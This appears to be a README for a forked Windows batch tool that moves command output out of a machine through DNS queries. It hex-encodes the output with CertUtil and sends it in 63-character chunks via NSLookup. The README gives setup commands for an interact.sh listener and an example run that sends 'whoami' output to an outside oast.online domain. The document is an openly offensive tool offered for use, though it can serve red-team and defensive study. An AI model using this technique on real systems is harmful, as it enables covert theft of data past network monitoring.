# DNS Exfiltrator via Hex

This is a fork from Ivan Šincek. I modified the script to work with Hex encoding instead of Base64. The first parameter, the command, doesn't need to be encoded.

Exfiltrate data with DNS queries in Hex. Based on CertUtil and NSLookup.

Command output will be encoded in Hex with CertUtil and exfiltrated in chunks up to 63 characters per query with NSLookup.

## How to Run

Download, unpack, give necessary permissions, and run the latest [interact.sh](https://github.com/projectdiscovery/interactsh/releases) client.

```fundamental
chmod +x interactsh-client

./interactsh-client -dns-only -json -o interactsh.json
```

Open the Command Prompt where you saved the batch script and run the following command:

```fundamental
dns-exfil-hex.bat whoami xyz.oast.online
```
